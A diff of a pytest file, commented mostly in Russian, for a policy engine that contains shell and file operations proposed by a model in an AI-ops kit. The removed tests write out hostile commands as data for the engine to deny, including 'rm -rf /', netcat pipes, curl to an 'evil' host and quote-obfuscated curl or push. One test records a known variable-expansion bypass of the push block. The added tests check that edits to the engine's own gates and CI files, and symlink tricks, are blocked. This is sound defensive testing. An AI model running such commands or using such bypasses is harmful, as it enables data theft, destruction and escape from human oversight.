@@ -1,20 +1,21 @@
-"""Unit tests for tools/tool_broker.py — policy-enforced execution engine.
+"""Unit tests for tools/tool_broker.py — решения политики, path-containment, read/write, self-host.
 
-Tests the Policy class, execute() function, path containment, secret scrubbing,
-shell modes, network containment, and environment scrubbing. Complements the
-selftest wrapper with granular assertions.
+Тема этого файла: Policy.decide() (авторизация операций), path-traversal, инвариант execute()
+(денай без side-effects), абсолютные пути внутри корня, child-override protected_paths, read с
+диапазоном и self-host-защита движка/CI/реестров кита. Парный файл `test_tool_broker_shell.py`
+держит тему shell-канала (режимы/allowlist/сеть/block_push/scrub/sandbox_policy). Разрез
+behavior-preserving — тела тестов не менялись.
 """
 from __future__ import annotations
 
-import os
 import subprocess
-import sys
 from pathlib import Path
 
 import pytest
 
+from _tool_broker_helpers import _git_p0
+
 PKG_ROOT = Path(__file__).resolve().parents[2]
-sys.path.insert(0, str(PKG_ROOT / "tools"))
 
 from ai_ops_kit.engine import tool_broker
 
@@ -128,180 +129,6 @@ class TestExecuteInvariant:
         assert (child_root / "src" / "new.txt").is_file()
 
 
-@pytest.mark.critical_path
-@pytest.mark.unit
-class TestShellExecution:
-    """Tests for shell command execution and containment."""
-
-    def test_shell_execution_returns_exit_code(self, child_root):
-        """Shell execution should return exit_code in evidence."""
-        subprocess.run(["git", "init"], cwd=child_root, capture_output=True)
-        policy = tool_broker.Policy(level="execution")
-        action = {"op": "shell", "command": "echo hello"}
-        result = tool_broker.execute(action, child_root, policy)
-        assert result["allowed"] is True
-        assert result["exit_code"] == 0
-
-    def test_destructive_command_denied(self, child_root):
-        """Destructive commands (rm -rf /) should be denied."""
-        subprocess.run(["git", "init"], cwd=child_root, capture_output=True)
-        policy = tool_broker.Policy(level="execution")
-        action = {"op": "shell", "command": "rm -rf /"}
-        result = tool_broker.execute(action, child_root, policy)
-        assert result["allowed"] is False
-
-    def test_git_push_force_denied(self, child_root):
-        """git push --force should be denied."""
-        subprocess.run(["git", "init"], cwd=child_root, capture_output=True)
-        policy = tool_broker.Policy(level="execution")
-        action = {"op": "shell", "command": "git push --force"}
-        result = tool_broker.execute(action, child_root, policy)
-        assert result["allowed"] is False
-
-
-@pytest.mark.critical_path
-@pytest.mark.unit
-class TestBlockPush:
-    """Tests for block_push containment."""
-
-    def test_block_push_denies_git_push(self, child_root):
-        """block_push=True should deny git push."""
-        subprocess.run(["git", "init"], cwd=child_root, capture_output=True)
-        policy = tool_broker.Policy(level="execution", block_push=True)
-        action = {"op": "shell", "command": "git push origin main"}
-        result = policy.decide(action)
-        assert result["allow"] is False
-
-    def test_block_push_allows_other_git(self, child_root):
-        """block_push=True should allow other git operations."""
-        subprocess.run(["git", "init"], cwd=child_root, capture_output=True)
-        policy = tool_broker.Policy(level="execution", block_push=True)
-        action = {"op": "shell", "command": "git status"}
-        result = policy.decide(action)
-        assert result["allow"] is True
-
-
-@pytest.mark.critical_path
-@pytest.mark.unit
-class TestShellModes:
-    """Tests for shell_mode — off, allowlist, unrestricted."""
-
-    def test_shell_mode_off_blocks_all(self, child_root):
-        """shell_mode=off should block all shell commands."""
-        subprocess.run(["git", "init"], cwd=child_root, capture_output=True)
-        policy = tool_broker.Policy(level="execution", shell_mode="off")
-        action = {"op": "shell", "command": "ls"}
-        result = policy.decide(action)
-        assert result["allow"] is False
-
-    def test_shell_mode_allowlist_restricts(self, child_root):
-        """shell_mode=allowlist should only allow listed binaries."""
-        subprocess.run(["git", "init"], cwd=child_root, capture_output=True)
-        policy = tool_broker.Policy(
-            level="execution",
-            shell_mode="allowlist",
-            shell_allowlist={"pytest", "git"},
-        )
-        # pytest allowed
-        action = {"op": "shell", "command": "pytest tests/"}
-        result = policy.decide(action)
-        assert result["allow"] is True
-
-        # nc not allowed
-        action = {"op": "shell", "command": "nc host 1234"}
-        result = policy.decide(action)
-        assert result["allow"] is False
-
-    def test_unknown_shell_mode_raises(self, child_root):
-        """Unknown shell_mode should raise ValueError during construction."""
-        subprocess.run(["git", "init"], cwd=child_root, capture_output=True)
-        with pytest.raises(ValueError):
-            tool_broker.Policy(level="execution", shell_mode="bogus")
-
-
-@pytest.mark.critical_path
-@pytest.mark.unit
-class TestNetworkContainment:
-    """Tests for allow_network — network command containment."""
-
-    def test_network_disabled_blocks_curl(self, child_root):
-        """allow_network=False should block curl."""
-        subprocess.run(["git", "init"], cwd=child_root, capture_output=True)
-        policy = tool_broker.Policy(level="execution", allow_network=False)
-        action = {"op": "shell", "command": "curl https://example.com"}
-        result = policy.decide(action)
-        assert result["allow"] is False
-
-    def test_network_disabled_allows_non_network(self, child_root):
-        """allow_network=False should not affect non-network commands."""
-        subprocess.run(["git", "init"], cwd=child_root, capture_output=True)
-        policy = tool_broker.Policy(level="execution", allow_network=False)
-        action = {"op": "shell", "command": "npm run build"}
-        result = policy.decide(action)
-        assert result["allow"] is True
-
-
-@pytest.mark.critical_path
-@pytest.mark.unit
-class TestScrubEnv:
-    """Tests for scrub_env — environment variable filtering."""
-
-    def test_scrub_env_strips_secrets(self):
-        """scrub_env should strip secret-like environment variables."""
-        env = {
-            "PATH": "/usr/bin",
-            "HOME": "/home/user",
-            "API_KEY": "secret123",
-            "DATABASE_URL": "postgres://...",
-            "GITHUB_TOKEN": "ghp_xxx",
-            "GITHUB_SHA": "abc123",
-        }
-        scrubbed = tool_broker.scrub_env(env)
-        assert "PATH" in scrubbed
-        assert "HOME" in scrubbed
-        assert "API_KEY" not in scrubbed
-        assert "DATABASE_URL" not in scrubbed
-        assert "GITHUB_TOKEN" not in scrubbed
-        assert "GITHUB_SHA" in scrubbed  # non-secret GitHub var
-
-    def test_scrub_env_passthrough(self):
-        """scrub_env passthrough should allow explicit additional vars."""
-        env = {
-            "PATH": "/usr/bin",
-            "CUSTOM_VAR": "value",
-        }
-        scrubbed = tool_broker.scrub_env(env, passthrough=["CUSTOM_VAR"])
-        assert "CUSTOM_VAR" in scrubbed
-
-
-@pytest.mark.critical_path
-@pytest.mark.unit
-class TestSandboxPolicy:
-    """Tests for sandbox_policy() — hardened policy factory."""
-
-    def test_sandbox_policy_has_allowlist(self, child_root):
-        """sandbox_policy should return policy with shell_mode=allowlist."""
-        policy = tool_broker.sandbox_policy(child_root=child_root)
-        assert policy.shell_mode == "allowlist"
-        assert policy.block_push is True
-
-    def test_sandbox_allows_dev_tools(self, child_root):
-        """sandbox_policy should allow common dev tools."""
-        subprocess.run(["git", "init"], cwd=child_root, capture_output=True)
-        policy = tool_broker.sandbox_policy(child_root=child_root)
-        action = {"op": "shell", "command": "pytest tests/"}
-        result = policy.decide(action)
-        assert result["allow"] is True
-
-    def test_sandbox_blocks_dangerous_tools(self, child_root):
-        """sandbox_policy should block dangerous tools like nc."""
-        subprocess.run(["git", "init"], cwd=child_root, capture_output=True)
-        policy = tool_broker.sandbox_policy(child_root=child_root)
-        action = {"op": "shell", "command": "nc host 1234"}
-        result = policy.decide(action)
-        assert result["allow"] is False
-
-
 @pytest.mark.unit
 class TestAbsolutePathInsideRoot:
     """F-016 (находка живой квалификации, раунд C, T2): writer предлагал АБСОЛЮТНЫЙ путь внутри
@@ -369,38 +196,6 @@ class TestAbsolutePathInsideRoot:
 
 
 # ─── перенос из test_tool_broker_selftest.py (монолит снят): гранулярное покрытие политик ───────
-
-
-@pytest.mark.critical_path
-@pytest.mark.unit
-class TestGitGauntlet:
-    """v3.0.11 (finding аудита P1): op:"git" проходит ТОТ ЖЕ gauntlet, что shell — `op` контролирует
-    модель, раньше git-ярлык обходил shell_mode/network/allowlist."""
-
-    def _sandbox(self):
-        return tool_broker.Policy(level="execution", shell_mode="allowlist",
-                                  shell_allowlist={"git", "pytest"}, allow_network=False)
-
-    def test_bash_disguised_as_git_denied(self, child_root):
-        """`bash -c` под видом op:git запрещён (bash не в allowlist)."""
-        result = self._sandbox().decide({"op": "git", "command": "bash -c 'echo x'"})
-        assert result["allow"] is False
-
-    def test_network_curl_disguised_as_git_denied(self, child_root):
-        """Сетевой curl под видом op:git запрещён (allow_network=False)."""
-        result = self._sandbox().decide({"op": "git", "command": "curl http://evil/x -O /tmp/x"})
-        assert result["allow"] is False
-
-    def test_legit_git_status_as_git_allowed(self, child_root):
-        """Легитимный `git status` под op:git разрешён (git в allowlist)."""
-        result = self._sandbox().decide({"op": "git", "command": "git status"})
-        assert result["allow"] is True
-
-    def test_git_denied_under_shell_off(self, child_root):
-        """shell_mode=off: git тоже запрещён (исполняется как shell-команда)."""
-        policy = tool_broker.Policy(level="execution", shell_mode="off")
-        result = policy.decide({"op": "git", "command": "git status"})
-        assert result["allow"] is False
 
 
 @pytest.mark.critical_path
@@ -523,243 +318,197 @@ class TestReadReturnsHeadAndRange:
         assert "TAIL_MARKER" in ev.get("output_tail", "")
 
 
-@pytest.mark.critical_path
-@pytest.mark.unit
-class TestShellSecretScrub:
-    """SECURITY (finding аудита): секрет из env НЕ виден shell-команде (scrub_env вырезает его из
-    окружения подпроцесса), но функциональный env (PATH) сохранён для сборки. Значения — фейковые,
-    собранные в рантайме, чтобы downstream-сканеры не флагали тест."""
+# ─── P0 (аудит 04.09): движок/CI/реестры кита под owner-approval ТОЛЬКО на self-host ────────────
 
-    def _run_echo(self, tmp_path):
-        root = tmp_path
-        policy = tool_broker.Policy(level="execution", write_scope=["src/"])
-        tok = "sk-" + "super-secret-123"
-        key = "sk-ant" + "-xyz"
-        os.environ["MY_FAKE_TOKEN"] = tok
-        os.environ["ANTHROPIC_API_KEY"] = key
-        try:
-            ev = tool_broker.execute(
-                {"op": "shell",
-                 "command": "echo TOK=[$MY_FAKE_TOKEN] KEY=[$ANTHROPIC_API_KEY] PATH_SET=${PATH:+yes}"},
-                root, policy)
-        finally:
-            os.environ.pop("MY_FAKE_TOKEN", None)
-            os.environ.pop("ANTHROPIC_API_KEY", None)
-        return ev.get("output_tail", ""), tok, key
 
-    def test_shell_does_not_see_env_secret(self, tmp_path):
-        out, tok, key = self._run_echo(tmp_path)
-        assert tok not in out
-        assert key not in out
-        assert "TOK=[]" in out
-        assert "KEY=[]" in out
+def _make_kit_markers(root):
+    """Проставить корневые маркеры исходников кита: пакет + VERSION + манифест."""
+    (root / "ai_ops_kit").mkdir(parents=True, exist_ok=True)
+    (root / "ai_ops_kit" / "__init__.py").write_text("", encoding="utf-8")
+    (root / "VERSION").write_text("4.0.0\n", encoding="utf-8")
+    (root / "manifest").mkdir(parents=True, exist_ok=True)
+    (root / "manifest" / "ai-ops-manifest.yaml").write_text("kind: ai-ops-manifest\n", encoding="utf-8")
 
-    def test_functional_env_path_preserved(self, tmp_path):
-        out, _, _ = self._run_echo(tmp_path)
-        assert "PATH_SET=yes" in out
+
+@pytest.fixture
+def self_host_repo(tmp_path):
+    """Клон исходников кита (self-host): корневые маркеры пакета + движок/CI/реестры с коммитом,
+    чтобы пост-фактум сторож shell мог сверить delta и откатить."""
+    repo = tmp_path / "kit"
+    for d in ("src", ".github/workflows", "ai_ops_kit/gates", "registry"):
+        (repo / d).mkdir(parents=True)
+    _make_kit_markers(repo)
+    (repo / "src" / "main.py").write_text("x = 1\n", encoding="utf-8")
+    (repo / ".github" / "workflows" / "ci.yml").write_text("on: push\n", encoding="utf-8")
+    (repo / "ai_ops_kit" / "gates" / "g.py").write_text("GATE = 1\n", encoding="utf-8")
+    (repo / "registry" / "policy.yaml").write_text("k: v\n", encoding="utf-8")
+    _git_p0(repo, "init", "-q")
+    _git_p0(repo, "config", "user.email", "t@example.com")
+    _git_p0(repo, "config", "user.name", "t")
+    _git_p0(repo, "add", "-A")
+    _git_p0(repo, "commit", "-qm", "seed")
+    return repo
 
 
 @pytest.mark.critical_path
 @pytest.mark.unit
-class TestScrubEnvAllowlist:
-    """v2.63 (adversarial-review finding): переход с denylist на ALLOWLIST — denylist по именам
-    пропускал целые классы (голый _KEY, DATABASE_URL/DSN/JWT/PAT…). Allowlist режет их ВСЕ."""
+class TestP0SelfHostEngineProtected:
+    """P0-2 (аудит 04.09): движок/CI/реестры кита (.github/, ai_ops_kit/, registry/) — под owner-approval,
+    но ТОЛЬКО когда прогон идёт над САМИМ китом (self-host / догфуд). Не approval — не хардблок: кит с
+    явным одобрением владельца править себя может, молча тем же прогоном — нет.
 
-    def test_allowlist_preserves_path_and_node_env(self):
-        """Обычные env (PATH/NODE_ENV) сохранены без изменений."""
-        assert tool_broker.scrub_env({"PATH": "/bin", "NODE_ENV": "prod"}) == \
-            {"PATH": "/bin", "NODE_ENV": "prod"}
+    Пробы КРАСНЕЮТ, если снять self-host-условие (`if _is_kit_self_host(...)` -> `if False`): движок
+    перестанет быть protected на self-host, и правки .github/ / ai_ops_kit/ без одобрения пройдут.
+    """
 
-    def test_allowlist_cuts_all_secret_classes(self):
-        """ВСЕ классы секретов (в т.ч. голый _KEY/URL/DSN/JWT/PAT) вырезаны — остаётся только PATH."""
-        leaky = {"GITHUB_TOKEN": "1", "AZURE_OPENAI_KEY": "2", "STRIPE_KEY": "3",
-                 "DATABASE_URL": "postgres://u:p@h/d", "SENTRY_DSN": "4", "JWT": "5",
-                 "PAT": "6", "GEMINI_KEY": "7", "ENCRYPTION_KEY": "8", "PATH": "/bin"}
-        assert set(tool_broker.scrub_env(leaky)) == {"PATH"}
+    # ── self-host: детект ──────────────────────────────────────────────────────────────────────
+    def test_detects_kit_sources_as_self_host(self, self_host_repo):
+        assert tool_broker._is_kit_self_host(self_host_repo) is True
+
+    def test_ordinary_child_is_not_self_host(self, tmp_path):
+        """Дочка (нет корневых маркеров кита) self-host'ом НЕ считается — движок не навязан."""
+        child = tmp_path / "child"
+        (child / "src").mkdir(parents=True)
+        (child / ".ai-ops.yaml").write_text("kind: ai-ops-child-config\n", encoding="utf-8")
+        assert tool_broker._is_kit_self_host(child) is False
+
+    def test_partial_markers_not_self_host(self, tmp_path):
+        """Одного пакета мало: без VERSION+манифеста — не self-host (не ловим совпадение имени)."""
+        root = tmp_path / "partial"
+        (root / "ai_ops_kit").mkdir(parents=True)
+        (root / "ai_ops_kit" / "__init__.py").write_text("", encoding="utf-8")
+        assert tool_broker._is_kit_self_host(root) is False
+
+    # ── self-host: движок под approval-gate (decide) ──────────────────────────────────────────
+    def test_self_host_engine_write_denied_without_approval(self, self_host_repo):
+        """Правка ai_ops_kit/ на self-host без privileged+approval — запрещена (даже в write_scope)."""
+        policy = tool_broker.Policy(level="controlled-write",
+                                    write_scope=["ai_ops_kit/", "src/"], child_root=str(self_host_repo))
+        result = policy.decide({"op": "write", "path": "ai_ops_kit/gates/g.py"})
+        assert result["allow"] is False
+        assert "protected" in result["reason"]
+
+    def test_self_host_github_write_denied_without_approval(self, self_host_repo):
+        policy = tool_broker.Policy(level="controlled-write",
+                                    write_scope=[".github/", "src/"], child_root=str(self_host_repo))
+        result = policy.decide({"op": "write", "path": ".github/workflows/ci.yml"})
+        assert result["allow"] is False
+
+    def test_self_host_registry_write_denied_without_approval(self, self_host_repo):
+        policy = tool_broker.Policy(level="controlled-write",
+                                    write_scope=["registry/"], child_root=str(self_host_repo))
+        result = policy.decide({"op": "write", "path": "registry/policy.yaml"})
+        assert result["allow"] is False
+
+    def test_self_host_engine_write_allowed_with_owner_approval(self, self_host_repo):
+        """Approval-gate, НЕ хардблок: privileged + protected_path_write -> кит правит движок себе сам."""
+        policy = tool_broker.Policy(level="privileged", write_scope=["ai_ops_kit/"],
+                                    approvals={"protected_path_write"}, child_root=str(self_host_repo))
+        result = policy.decide({"op": "write", "path": "ai_ops_kit/gates/g.py"})
+        assert result["allow"] is True
+
+    def test_self_host_non_engine_path_still_allowed(self, self_host_repo):
+        """Обычный путь (src/) на self-host не задет — защита точечная, не тотальная."""
+        policy = tool_broker.Policy(level="controlled-write", write_scope=["src/"],
+                                    child_root=str(self_host_repo))
+        assert policy.decide({"op": "write", "path": "src/main.py"})["allow"] is True
+
+    # ── self-host: движок под сторожем shell (execute) ────────────────────────────────────────
+    def test_self_host_shell_edit_engine_reverted_and_denied(self, self_host_repo):
+        """`sed`/`echo >` по ai_ops_kit/gates на self-host без одобрения -> откат + запрет."""
+        policy = tool_broker.sandbox_policy(child_root=str(self_host_repo), write_scope=["ai_ops_kit/"])
+        ev = tool_broker.execute(
+            {"op": "shell", "command": "echo 'GATE = 99' > ai_ops_kit/gates/g.py"}, self_host_repo, policy)
+        assert ev["allowed"] is False, "правка движка на self-host без одобрения обязана быть запрещена"
+        assert ev["fs_guard"]["violations"], "нарушение protected должно попасть в evidence"
+        assert (self_host_repo / "ai_ops_kit" / "gates" / "g.py").read_text() == "GATE = 1\n", "не откачено"
+
+    def test_self_host_shell_edit_github_reverted(self, self_host_repo):
+        policy = tool_broker.sandbox_policy(child_root=str(self_host_repo), write_scope=[".github/"])
+        ev = tool_broker.execute(
+            {"op": "shell", "command": "echo 'on: pull_request' > .github/workflows/ci.yml"},
+            self_host_repo, policy)
+        assert ev["allowed"] is False
+        assert (self_host_repo / ".github" / "workflows" / "ci.yml").read_text() == "on: push\n"
+
+    # ── дочка (не кит): её .github/ в write_scope НЕ сломан ────────────────────────────────────
+    def test_ordinary_child_github_write_in_scope_allowed(self, tmp_path):
+        """РЕГРЕСС отката PR #504: обычная дочка пишет свой .github/ в рамках write_scope — РАЗРЕШЕНО.
+        Self-host-защита её не касается (нет корневых маркеров кита)."""
+        child = tmp_path / "child"
+        (child / ".github" / "workflows").mkdir(parents=True)
+        policy = tool_broker.Policy(level="controlled-write",
+                                    write_scope=[".github/"], child_root=str(child))
+        result = policy.decide({"op": "write", "path": ".github/workflows/ci.yml"})
+        assert result["allow"] is True, "дочкина запись в свой .github/ не должна быть сломана"
+
+    def test_ordinary_child_engine_path_not_protected(self, tmp_path):
+        """У дочки нет ai_ops_kit/ как protected по self-host — обычный путь в scope разрешён."""
+        child = tmp_path / "child"
+        (child / "ai_ops_kit").mkdir(parents=True)
+        policy = tool_broker.Policy(level="controlled-write",
+                                    write_scope=["ai_ops_kit/"], child_root=str(child))
+        assert policy.decide({"op": "write", "path": "ai_ops_kit/x.py"})["allow"] is True
 
 
 @pytest.mark.critical_path
 @pytest.mark.unit
-class TestBlockPushAndNetworkDefaults:
-    """v2.81 Containment: block_push и allow_network. Проверяем варианты и ДЕФОЛТЫ (push/curl
-    разрешены политикой по умолчанию), а также env-префиксы в allowlist."""
+class TestSymlinkTargetContainment:
+    """R-42: симлинк внутри корня не должен обходить protected_paths/write_scope.
 
-    def test_block_push_denies_push_u_origin(self, child_root):
-        """block_push: `git push -u origin feat` (shell) запрещён."""
-        policy = tool_broker.Policy(level="execution", write_scope=["src/"], block_push=True)
-        result = policy.decide({"op": "shell", "command": "git push -u origin feat"})
-        assert result["allow"] is False
+    decide() судит НАПИСАННЫЙ путь, но write_text РАЗЫМЕНОВЫВАЕТ симлинк. Симлинк, чья цель не
+    покидает корень (`src/out -> migrations/destructive`), проходил _within_root (та стережёт только
+    ПОБЕГ за корень) и переписывал protected-цель мимо политики. Замер — по СОДЕРЖИМОМУ на диске
+    (не по вердикту): контроль доказывает, что проба дошла до места.
+    """
 
-    def test_block_push_allows_git_commit(self, child_root):
-        """block_push: обычный git (commit) по-прежнему разрешён."""
-        policy = tool_broker.Policy(level="execution", write_scope=["src/"], block_push=True)
-        result = policy.decide({"op": "shell", "command": "git commit -m x"})
-        assert result["allow"] is True
+    def _repo(self, tmp_path):
+        (tmp_path / "migrations" / "destructive").mkdir(parents=True)
+        victim = tmp_path / "migrations" / "destructive" / "drop_users.sql"
+        victim.write_text("SAFE-ORIGINAL", encoding="utf-8")
+        (tmp_path / "src").mkdir()
+        pol = tool_broker.Policy(level="controlled-write", write_scope=["src/"],
+                                 child_root=str(tmp_path))
+        return victim, pol
 
-    def test_block_push_false_default_allows_push(self, child_root):
-        """block_push=False (дефолт): push разрешён политикой."""
-        result = tool_broker.Policy(level="execution").decide(
-            {"op": "shell", "command": "git push"})
-        assert result["allow"] is True
+    def test_dir_symlink_to_protected_is_denied_and_file_intact(self, tmp_path):
+        import os
+        victim, pol = self._repo(tmp_path)
+        os.symlink("../migrations/destructive", tmp_path / "src" / "out")   # каталог-симлинк в корне
+        ev = tool_broker.execute({"op": "write", "path": "src/out/drop_users.sql",
+                                  "content": "PWNED"}, tmp_path, pol)
+        assert ev["allowed"] is False, ev
+        assert "symlink-target-guard" in ev["reason"], ev
+        assert victim.read_text(encoding="utf-8") == "SAFE-ORIGINAL", "protected-файл перезаписан через симлинк"
 
-    def test_allowlist_npm_ci_allowed(self, child_root):
-        """shell_mode=allowlist: npm ci разрешён (npm в allowlist)."""
-        policy = tool_broker.Policy(level="execution", shell_mode="allowlist",
-                                    shell_allowlist={"npm", "pytest", "git"})
-        result = policy.decide({"op": "shell", "command": "npm ci"})
-        assert result["allow"] is True
+    def test_file_symlink_to_protected_is_denied_and_file_intact(self, tmp_path):
+        import os
+        victim, pol = self._repo(tmp_path)
+        os.symlink("../migrations/destructive/drop_users.sql", tmp_path / "src" / "alias.sql")
+        ev = tool_broker.execute({"op": "write", "path": "src/alias.sql", "content": "PWNED"},
+                                 tmp_path, pol)
+        assert ev["allowed"] is False, ev
+        assert victim.read_text(encoding="utf-8") == "SAFE-ORIGINAL"
 
-    def test_allowlist_env_prefix_does_not_shift_binary(self, child_root):
-        """shell_mode=allowlist: env-префикс не сбивает бинарь (`CI=1 npm test` разрешён)."""
-        policy = tool_broker.Policy(level="execution", shell_mode="allowlist",
-                                    shell_allowlist={"npm", "pytest", "git"})
-        result = policy.decide({"op": "shell", "command": "CI=1 npm test"})
-        assert result["allow"] is True
+    def test_symlink_escaping_root_is_contained(self, tmp_path):
+        import os
+        outside = tmp_path.parent / "outside-target.sql"
+        outside.write_text("OUTSIDE", encoding="utf-8")
+        (tmp_path / "src").mkdir()
+        os.symlink(str(outside), tmp_path / "src" / "escape.sql")   # цель ЗА корнем
+        pol = tool_broker.Policy(level="controlled-write", write_scope=["src/"],
+                                 child_root=str(tmp_path))
+        ev = tool_broker.execute({"op": "write", "path": "src/escape.sql", "content": "PWNED"},
+                                 tmp_path, pol)
+        assert ev["allowed"] is False, ev
+        assert outside.read_text(encoding="utf-8") == "OUTSIDE"
 
-    def test_allowlist_curl_denied(self, child_root):
-        """shell_mode=allowlist: произвольный бинарь (curl) запрещён."""
-        policy = tool_broker.Policy(level="execution", shell_mode="allowlist",
-                                    shell_allowlist={"npm", "pytest", "git"})
-        result = policy.decide({"op": "shell", "command": "curl http://x"})
-        assert result["allow"] is False
-
-    def test_network_disabled_blocks_wget(self, child_root):
-        """allow_network=False: wget запрещён."""
-        policy = tool_broker.Policy(level="execution", allow_network=False)
-        result = policy.decide({"op": "shell", "command": "wget http://x"})
-        assert result["allow"] is False
-
-    def test_network_enabled_default_allows_curl(self, child_root):
-        """allow_network=True (дефолт): curl разрешён политикой."""
-        result = tool_broker.Policy(level="execution").decide(
-            {"op": "shell", "command": "curl http://x"})
-        assert result["allow"] is True
-
-    def test_sandbox_policy_blocks_git_push(self, child_root):
-        """sandbox_policy: git push заблокирован (доставка только движком)."""
-        policy = tool_broker.sandbox_policy(child_root=str(child_root), write_scope=["src/"])
-        result = policy.decide({"op": "shell", "command": "git push origin x"})
-        assert result["allow"] is False
-
-
-@pytest.mark.critical_path
-@pytest.mark.unit
-class TestAllowlistBypassSegments:
-    """v2.85 hardening: посегментная allowlist-проверка закрывает chained/piped/background/
-    substitution обходы; легитимные цепочки при этом проходят."""
-
-    def _sandbox(self, child_root):
-        return tool_broker.sandbox_policy(child_root=str(child_root), write_scope=["src/"])
-
-    def test_chained_curl_denied(self, child_root):
-        """`pytest -q && curl http://evil` -> DENY (curl вне allowlist)."""
-        result = self._sandbox(child_root).decide(
-            {"op": "shell", "command": "pytest -q && curl http://evil"})
-        assert result["allow"] is False
-
-    def test_pipe_nc_denied(self, child_root):
-        """`cat x | nc host 1` -> DENY (nc вне allowlist)."""
-        result = self._sandbox(child_root).decide(
-            {"op": "shell", "command": "cat x | nc host 1"})
-        assert result["allow"] is False
-
-    def test_chained_wget_denied(self, child_root):
-        """`ls && wget http://x` -> DENY (wget вне allowlist)."""
-        result = self._sandbox(child_root).decide(
-            {"op": "shell", "command": "ls && wget http://x"})
-        assert result["allow"] is False
-
-    def test_command_substitution_denied(self, child_root):
-        """`echo $(curl …)` -> DENY (подстановка команд запрещена в allowlist-режиме)."""
-        result = self._sandbox(child_root).decide(
-            {"op": "shell", "command": "echo $(curl http://x)"})
-        assert result["allow"] is False
-
-    def test_backtick_substitution_denied(self, child_root):
-        """backtick-подстановка `echo `curl …`` -> DENY."""
-        result = self._sandbox(child_root).decide(
-            {"op": "shell", "command": "echo `curl http://x`"})
-        assert result["allow"] is False
-
-    def test_legit_chained_npm_allowed(self, child_root):
-        """Легитимный chained `npm ci && npm test` -> ALLOW."""
-        result = self._sandbox(child_root).decide(
-            {"op": "shell", "command": "npm ci && npm test"})
-        assert result["allow"] is True
-
-    def test_background_psql_denied(self, child_root):
-        """`true & psql -c x` -> DENY (psql вне allowlist, & — разделитель сегментов)."""
-        result = self._sandbox(child_root).decide(
-            {"op": "shell", "command": "true & psql -c x"})
-        assert result["allow"] is False
-
-    def test_raw_bash_c_denied(self, child_root):
-        """Сырой bash/sh УБРАН из sandbox-набора -> `bash -c …` DENY."""
-        result = self._sandbox(child_root).decide(
-            {"op": "shell", "command": "bash -c 'curl http://x'"})
-        assert result["allow"] is False
-
-    def test_command_binaries_splits_on_single_ampersand(self):
-        """_command_binaries: одиночный & разбивает на сегменты."""
-        assert tool_broker._command_binaries("true & psql -c x") == ["true", "psql"]
-
-
-@pytest.mark.critical_path
-@pytest.mark.unit
-class TestQuoteObfuscation:
-    """v2.85: quote-обфускация push/сети снимается нормализацией; переменная/eval — заявленная
-    честная граница best-effort (НЕ ловится, документировано, не тихо)."""
-
-    def test_quote_obfuscated_push_caught(self, child_root):
-        """block_push: `git pu""sh origin main` поймана нормализацией."""
-        policy = tool_broker.Policy(level="execution", write_scope=["src/"], block_push=True)
-        result = policy.decide({"op": "shell", "command": 'git pu""sh origin main'})
-        assert result["allow"] is False
-
-    def test_quote_obfuscated_curl_caught(self, child_root):
-        """allow_network=False: `cu"r"l http://x` поймана нормализацией."""
-        policy = tool_broker.Policy(level="execution", allow_network=False)
-        result = policy.decide({"op": "shell", "command": 'cu"r"l http://x'})
-        assert result["allow"] is False
-
-    def test_variable_expansion_not_caught_honest_boundary(self, child_root):
-        """Честная граница: `p=push; git $p origin main` НЕ ловится (переменные не разворачиваются)."""
-        policy = tool_broker.Policy(level="execution", write_scope=["src/"], block_push=True)
-        result = policy.decide({"op": "shell", "command": "p=push; git $p origin main"})
-        assert result["allow"] is True
-
-    def test_command_binaries_ignores_var_prefix(self):
-        """_command_binaries: сегменты с VAR=val префиксом дают бинарь сегмента."""
-        assert tool_broker._command_binaries("CI=1 npm test && ruff check") == ["npm", "ruff"]
-
-
-@pytest.mark.unit
-def test_scrub_failure_withholds_output_instead_of_leaking(monkeypatch):
-    """Срез engine ратчета 2026-08-12: `_scrub_output` гасил ЛЮБОЙ сбой и возвращал текст КАК ЕСТЬ.
-    Причина была неверна: «худший случай» этой функции — напечатанный тулом токен, уехавший в
-    evidence открытым текстом и МОЛЧА. Скраб недоступен -> содержимое не показываем вовсе."""
-    secret = "ghp_" + "B" * 36
-    real = tool_broker._scrub_output(f"token {secret}")
-    assert "ghp_" not in real and "REDACTED" in real, "исправный путь должен редактировать"
-
-    from ai_ops_kit.security import security_scan
-
-    class _Broken:
-        """Скраб есть, но не работает — сбой ровно там, где раньше стоял `pass`."""
-
-        def __iter__(self):
-            raise RuntimeError("набор паттернов недоступен")
-
-    monkeypatch.setattr(security_scan, "SECRET_PATTERNS", _Broken())
-    out = tool_broker._scrub_output(f"token {secret}")
-
-    assert secret not in out, "СЕКРЕТ УТЁК в evidence при недоступном скрабе — тот самый худший случай"
-    assert "OUTPUT-WITHHELD" in out, "утаивание должно быть НАЗВАНО, а не выглядеть как пустой вывод"
-    assert "RuntimeError" in out, "причина утаивания должна быть видна там же, где вывод"
-
-
-@pytest.mark.unit
-def test_scrub_does_not_touch_empty_output(monkeypatch):
-    """Граница: пустой вывод не превращается в сообщение об утаивании (нечего утаивать)."""
-    assert tool_broker._scrub_output("") == ""
-    assert tool_broker._scrub_output(None) is None
+    def test_legit_write_in_scope_still_allowed(self, tmp_path):
+        """Изоляция слоя: страж цели НЕ рубит обычную запись без симлинка (не fail-closed)."""
+        (tmp_path / "src").mkdir()
+        pol = tool_broker.Policy(level="controlled-write", write_scope=["src/"],
+                                 child_root=str(tmp_path))
+        ev = tool_broker.execute({"op": "write", "path": "src/legit.py", "content": "x = 1"},
+                                 tmp_path, pol)
+        assert ev["allowed"] is True and ev["ok"] is True, ev
+        assert (tmp_path / "src" / "legit.py").read_text(encoding="utf-8") == "x = 1"
